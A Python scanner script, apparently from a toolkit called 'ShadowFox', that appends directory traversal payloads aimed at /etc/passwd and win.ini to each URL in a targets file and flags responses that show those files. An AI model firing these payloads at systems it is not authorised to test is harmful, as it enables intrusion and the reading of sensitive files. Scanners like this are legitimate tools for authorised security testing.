import requests
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from log_to_text import log_to_text
from tools.auto_add_severity import classify_severity
from logics.fuzz_ai_trigger import ai_trigger_if_needed

def scan_directory_traversal(url):
    traversal_payloads = [
        "../../../../../etc/passwd",
        "..\\..\\..\\..\\..\\windows\\win.ini",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd"
    ]

    headers = {
        "User-Agent": "ShadowFox-DirTraversal"
    }

    for payload in traversal_payloads:
        if "FUZZ" in url:
            test_url = url.replace("FUZZ", payload)
        else:
            test_url = f"{url}/{payload}"

        try:
            response = requests.get(test_url, headers=headers, timeout=10)
            if "root:x:" in response.text or "[extensions]" in response.text:
                log_to_text(f"[DIR-TRAVERSAL] {test_url} -> {payload}")
                severity = classify_severity(response.text)
                ai_trigger_if_needed("Directory Traversal", test_url, payload, response.text, severity)
                print(f"[+] TRAVERSAL DETEKTOVAN: {test_url}")
                return {"url": test_url, "payload": payload, "severity": severity}
        
        except Exception as e:
            print(f"[-] Greška: {e}")

    print("[-] Nema directory traversal ranjivosti pronađenih.")
    return None

if __name__ == "__main__":
    with open("targets/targets.txt", "r") as f:
        urls = f.read().splitlines()

    for url in urls:
        scan_directory_traversal(url)
